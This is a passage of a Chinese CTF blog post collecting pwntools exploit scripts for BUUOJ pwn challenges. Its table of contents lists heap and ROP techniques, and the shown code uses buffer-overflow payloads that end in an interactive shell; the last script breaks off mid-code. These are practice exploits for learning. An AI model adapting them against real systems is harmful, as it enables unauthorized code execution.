class="toc-text">典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-强网杯2019-拟态-STKOF"><span class="toc-number">42.</span> <span class="toc-text">0x40 强网杯2019 拟态 STKOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x41-ciscn-2019-ne-3"><span class="toc-number">43.</span> <span class="toc-text">0x41 ciscn_2019_ne_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x42-bcloud-bctf-2016"><span class="toc-number">44.</span> <span class="toc-text">0x42 bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的house-of-force"><span class="toc-number">44.1.</span> <span class="toc-text">典型的house of force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x43-web-of-sci-volga-2016"><span class="toc-number">45.</span> <span class="toc-text">0x43 web_of_sci_volga_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-canary，然后普通的ROP"><span class="toc-number">45.1.</span> <span class="toc-text">leak canary，然后普通的ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x44-ciscn-2019-sw-1"><span class="toc-number">46.</span> <span class="toc-text">0x44 ciscn_2019_sw_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#printf花式溢出漏洞，无限循环"><span class="toc-number">46.1.</span> <span class="toc-text">printf花式溢出漏洞，无限循环</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x45-中关村2019-one-string"><span class="toc-number">47.</span> <span class="toc-text">0x45 [中关村2019]one_string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#orw"><span class="toc-number">47.1.</span> <span class="toc-text">orw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x46-bjdctf-2020-babyrop"><span class="toc-number">48.</span> <span class="toc-text">0x46 bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x47-bamboobox"><span class="toc-number">49.</span> <span class="toc-text">0x47 bamboobox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x48-poke-naxtos-sthack-2016"><span class="toc-number">50.</span> <span class="toc-text">0x48 poke_naxtos_sthack_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x49-ciscn-2019-final-4"><span class="toc-number">51.</span> <span class="toc-text">0x49 ciscn_2019_final_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#和ciscn-sw-10类似"><span class="toc-number">51.1.</span> <span class="toc-text">和ciscn_sw_10类似</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-ciscn-2019-s-6"><span class="toc-number">52.</span> <span class="toc-text">0x50 ciscn_2019_s_6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x51-ciscn-nw-4"><span class="toc-number">53.</span> <span class="toc-text">0x51 ciscn_nw_4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x52-第五空间2019-决赛-PWN5"><span class="toc-number">54.</span> <span class="toc-text">0x52 [第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x53-ZJCTF-2019-EasyHeap"><span class="toc-number">55.</span> <span class="toc-text">0x53 [ZJCTF 2019]EasyHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x54-ZJCTF-2019-login"><span class="toc-number">56.</span> <span class="toc-text">0x54 [ZJCTF 2019]login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x55-ciscn-2019-n-5"><span class="toc-number">57.</span> <span class="toc-text">0x55 ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x56-ciscn-2019-s-1"><span class="toc-number">58.</span> <span class="toc-text">0x56 ciscn_2019_s_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x57-fl0ppy-codegate-2016"><span class="toc-number">59.</span> <span class="toc-text">0x57 fl0ppy_codegate_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-bin-sh-x00"><span class="toc-number">59.1.</span> <span class="toc-text">经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x58-nsctf-online-2019-pwn1"><span class="toc-number">60.</span> <span class="toc-text">0x58 nsctf_online_2019_pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖-malloc-hook为one-gadget"><span class="toc-number">60.1.</span> <span class="toc-text">覆盖__malloc_hook为one_gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x59-nsctf-online-2019-pwn2"><span class="toc-number">61.</span> <span class="toc-text">0x59 nsctf_online_2019_pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-ciscn-2019-sw-5"><span class="toc-number">62.</span> <span class="toc-text">0x60 ciscn_2019_sw_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04"><span class="toc-number">62.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x61-ciscn-nw-2"><span class="toc-number">63.</span> <span class="toc-text">0x61 ciscn_nw_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04-2"><span class="toc-number">63.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x62-ciscn-2019-en-1"><span class="toc-number">64.</span> <span class="toc-text">0x62 ciscn_2019_en_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#标准的arm-pwn-rop，很适合新手"><span class="toc-number">64.1.</span> <span class="toc-text">标准的arm pwn rop，很适合新手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x63-ciscn-2019-n-2"><span class="toc-number">65.</span> <span class="toc-text">0x63 ciscn_2019_n_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04-3"><span class="toc-number">65.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x64-TWCTF-online-2019-asterisk-alloc"><span class="toc-number">66.</span> <span class="toc-text">0x64 TWCTF_online_2019_asterisk_alloc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x65-other-babystack"><span class="toc-number">67.</span> <span class="toc-text">0x65 other_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x66-ciscn-2019-es-5"><span class="toc-number">68.</span> <span class="toc-text">0x66 ciscn_2019_es_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0堆块和realloc函数之间的冲突导致double-free"><span class="toc-number">68.1.</span> <span class="toc-text">0堆块和realloc函数之间的冲突导致double free</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x67-roarctf-2019-realloc-magic"><span class="toc-number">69.</span> <span class="toc-text">0x67 roarctf_2019_realloc_magic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制-free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖-free-hook地址为system，然后直接free就可以拿到shell。"><span class="toc-number">69.1.</span> <span class="toc-text">realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制__free_hook - 8的地址数据为&#x2F;bin&#x2F;sh\x00，然后向下覆盖__free_hook地址为system，然后直接free就可以拿到shell。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"><span class="toc-number">69.2.</span> <span class="toc-text">非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu18"><span class="toc-number">69.3.</span> <span class="toc-text">Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规解"><span class="toc-number">69.4.</span> <span class="toc-text">常规解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu18-2"><span class="toc-number">69.5.</span> <span class="toc-text">Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非常规解"><span class="toc-number">69.6.</span> <span class="toc-text">非常规解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x68-roarctf-2019-easy-pwn"><span class="toc-number">70.</span> <span class="toc-text">0x68 roarctf_2019_easy_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#堆块重叠即可"><span class="toc-number">70.1.</span> <span class="toc-text">堆块重叠即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x69-极客大挑战-2019-Not-Bad"><span class="toc-number">71.</span> <span class="toc-text">0x69 [极客大挑战 2019]Not Bad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-axb-2019-fmt32"><span class="toc-number">72.</span> <span class="toc-text">0x70 axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x71-axb-2019-heap"><span class="toc-number">73.</span> <span class="toc-text">0x71 axb_2019_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x72-axb-2019-fmt64"><span class="toc-number">74.</span> <span class="toc-text">0x72 axb_2019_fmt64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x73-bytectf-2019-vip"><span class="toc-number">75.</span> <span class="toc-text">0x73 bytectf_2019_vip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x74-SWPUCTF-2019-login"><span class="toc-number">76.</span> <span class="toc-text">0x74 SWPUCTF_2019_login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x75-SWPUCTF-2019-p1KkHeap"><span class="toc-number">77.</span> <span class="toc-text">0x75 SWPUCTF_2019_p1KkHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x76-axb-2019-final-blindHeap"><span class="toc-number">78.</span> <span class="toc-text">0x76 axb_2019_final_blindHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x77-axb-2019-brop64"><span class="toc-number">79.</span> <span class="toc-text">0x77 axb_2019_brop64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x78-jarvisoj-tell-me-something"><span class="toc-number">80.</span> <span class="toc-text">0x78 jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x79-jarvisoj-level3-x64"><span class="toc-number">81.</span> <span class="toc-text">0x79 jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-jarvisoj-level0"><span class="toc-number">82.</span> <span class="toc-text">0x80 jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x81-jarvisoj-level1"><span class="toc-number">83.</span> <span class="toc-text">0x81 jarvisoj_level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x82-jarvisoj-level2"><span class="toc-number">84.</span> <span class="toc-text">0x82 jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x83-jarvisoj-level2-x64"><span class="toc-number">85.</span> <span class="toc-text">0x83 jarvisoj_level2(x64)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x84-jarvisoj-leve3"><span class="toc-number">86.</span> <span class="toc-text">0x84 jarvisoj_leve3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x85-jarvisoj-level4"><span class="toc-number">87.</span> <span class="toc-text">0x85 jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x86-jarvisoj-level5"><span class="toc-number">88.</span> <span class="toc-text">0x86 jarvisoj_level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x87-jarvisoj-level6"><span class="toc-number">89.</span> <span class="toc-text">0x87 jarvisoj_level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x88-jarvisoj-level6-x64"><span class="toc-number">90.</span> <span class="toc-text">0x88 jarvisoj_level6(x64)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x89-jarvisoj-test-your-memory"><span class="toc-number">91.</span> <span class="toc-text">0x89 jarvisoj_test_your_memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x90-jarvisoj-itemboard"><span class="toc-number">92.</span> <span class="toc-text">0x90 jarvisoj_itemboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x91-jarvisoj-fm"><span class="toc-number">93.</span> <span class="toc-text">0x91 jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x92-pwnable-orw"><span class="toc-number">94.</span> <span class="toc-text">0x92 pwnable_orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x93-jarvisoj-typo"><span class="toc-number">95.</span> <span class="toc-text">0x93 jarvisoj_typo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x94-others-shellcode"><span class="toc-number">96.</span> <span class="toc-text">0x94 others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x95-huxiangbei-2019-hacknote"><span class="toc-number">97.</span> <span class="toc-text">0x95 huxiangbei_2019_hacknote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x96-shanghai2019-boringheap"><span class="toc-number">98.</span> <span class="toc-text">0x96 shanghai2019_boringheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"><span class="toc-number">98.1.</span> <span class="toc-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x97-shanghai2019-login"><span class="toc-number">99.</span> <span class="toc-text">0x97 shanghai2019_login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-2"><span class="toc-number">99.1.</span> <span class="toc-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破libc"><span class="toc-number">99.2.</span> <span class="toc-text">爆破libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x98-xdctf2015-pwn200"><span class="toc-number">100.</span> <span class="toc-text">0x98 xdctf2015_pwn200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x99-bctf2016-bcloud"><span class="toc-number">101.</span> <span class="toc-text">0x99 bctf2016_bcloud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x100-cmcc-pwn2"><span class="toc-number">102.</span> <span class="toc-text">0x100 cmcc_pwn2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number"></span> <span class="toc-text">感想：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）"><span class="toc-number">0.1.</span> <span class="toc-text">2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～"><span class="toc-number">0.2.</span> <span class="toc-text">啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´"><span class="toc-number">0.3.</span> <span class="toc-text">这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich"><span class="toc-number">0.4.</span> <span class="toc-text">祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number"></span> <span class="toc-text">南梦小剧场：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←"><span class="toc-number">0.1.</span> <span class="toc-text">神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）"><span class="toc-number">0.2.</span> <span class="toc-text">南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；&#96;) 100个EXP，瞧瞧这是人说的话吗？）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"><span class="toc-number">0.3.</span> <span class="toc-text">神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"><span class="toc-number">0.4.</span> <span class="toc-text">南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number"></span> <span class="toc-text">更新与维护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后续可能会进一步更新x64和x32的解法（如果存在解的话）"><span class="toc-number">0.1.</span> <span class="toc-text">后续可能会进一步更新x64和x32的解法（如果存在解的话）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）"><span class="toc-number">0.2.</span> <span class="toc-text">EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/bg.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">咲夜南梦's 博客</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title"><div class="posttitle">CTF-BUUCTF-Pwn刷题之旅-(1)</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-07-13<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-02-16</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>评论数:</span><a href="/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#post-comment"><span class="gitalk-comment-count comment-count"></span></a></div></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h2 id="0x01-warmup-csaw-2016">0x01 warmup_csaw_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;warmup_csaw_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;warmup_csaw_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line"></span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	pop_rdi_ret &#x3D; 0x0000000000400713</span><br><span class="line">	payload &#x3D; &quot;a&quot; * 72 + p64(0x0000000000400611)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20035,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x02-RIP覆盖一下">0x02 RIP覆盖一下</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh&#x3D;0</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn1&quot;)		</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(&quot;buuoj.cn&quot;,6001)</span><br><span class="line">def pwn():</span><br><span class="line">	offset &#x3D; 23</span><br><span class="line">	payload &#x3D; offset*&quot;a&quot; + p64(0x000000000040118A)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-babyfengshui-33c3-2016">0x03 babyfengshui_33c3_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&quot;babyfengshui&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;x86_libc.so.6&quot;)</span><br><span class="line">def add(name_size,name,text_size,text):</span><br><span class="line">	sh.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	sh.sendline(&quot;0&quot;)</span><br><span class="line">	sh.recvuntil(&quot;size of description: &quot;)</span><br><span class="line">	sh.sendline(str(name_size))</span><br><span class="line">	sh.recvuntil(&quot;name: &quot;)</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	sh.recvuntil(&quot;text length: &quot;)</span><br><span class="line">	sh.sendline(str(text_size))</span><br><span class="line">	sh.recvuntil(&quot;text:&quot;)</span><br><span class="line">	sh.sendline(text)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def edit(idx,text,size):</span><br><span class="line">	sh.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;text length: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;text: &quot;)</span><br><span class="line">	sh.sendline(text)</span><br><span class="line">def delete(idx):</span><br><span class="line">	sh.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug !&#x3D; 0):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;babyfengshui&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(&quot;buuoj.cn&quot;,20002)</span><br><span class="line">def pwn():	</span><br><span class="line">	offset &#x3D; 0x98b1130 - 0x98b1008</span><br><span class="line">	add(0x80,&#39;\x11\n&#39;,0x80,&#39;\x12\n&#39;)</span><br><span class="line">	add(0x10,&#39;\x13\n&#39;,0x10,&quot;\x14\n&quot;)</span><br><span class="line">	